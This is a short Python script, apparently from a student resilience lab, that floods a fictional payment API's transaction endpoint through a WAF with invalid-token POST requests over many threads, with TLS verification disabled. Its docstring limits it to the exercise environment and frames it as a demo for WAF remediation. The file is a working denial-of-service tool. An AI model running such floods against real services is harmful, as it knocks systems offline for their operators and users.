#!/usr/bin/env python3
"""DoS applicatif sur payment-api, via le WAF (scénario de démo, formalisé en Phase 9).

Flood de requêtes POST /api/pay/transactions avec un jeton bidon : payment-api doit
interroger auth pour chaque requête, ce qui fait grimper latence et CPU. Le trafic porte
un User-Agent distinctif (signature) : la remédiation l'identifie dans les logs du WAF
et le bannit, sans toucher au trafic légitime.

Périmètre : UNIQUEMENT le SI fictif du groupe (point d'accès RESILIENCE-G12). Jamais le
réseau du campus ni une cible tierce.

Stdlib seulement : tourne dans python:3.12-slim sans dépendance.
    python dos_attack.py --target https://waf:8443 --duration 45 --concurrency 60
"""
import argparse
import ssl
import threading
import time
import urllib.request

STOP = threading.Event()
COUNT = [0]
LOCK = threading.Lock()


def worker(url: str, user_agent: str, ctx: ssl.SSLContext) -> None:
    body = b'{"dst":2,"amount":1}'
    while not STOP.is_set():
        req = urllib.request.Request(
            url, data=body, method="POST",
            headers={"Content-Type": "application/json",
                     "Authorization": "Bearer flood-no-valid-token",
                     "User-Agent": user_agent},
        )
        try:
            urllib.request.urlopen(req, timeout=5, context=ctx).read()
        except Exception:
            pass
        with LOCK:
            COUNT[0] += 1


def main() -> None:
    p = argparse.ArgumentParser(description="DoS applicatif de démo (SI fictif uniquement)")
    p.add_argument("--target", default="https://waf:8443")
    p.add_argument("--duration", type=int, default=45)
    p.add_argument("--concurrency", type=int, default=60)
    p.add_argument("--user-agent", default="ResilienceDoS/1.0")
    args = p.parse_args()

    url = f"{args.target}/api/pay/transactions"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    print(f"[attack] cible {url} | {args.concurrency} threads | {args.duration}s | UA {args.user_agent}")
    threads = [threading.Thread(target=worker, args=(url, args.user_agent, ctx), daemon=True)
               for _ in range(args.concurrency)]
    for t in threads:
        t.start()

    time.sleep(args.duration)
    STOP.set()
    time.sleep(1)
    print(f"[attack] terminé, {COUNT[0]} requêtes envoyées")


if __name__ == "__main__":
    main()
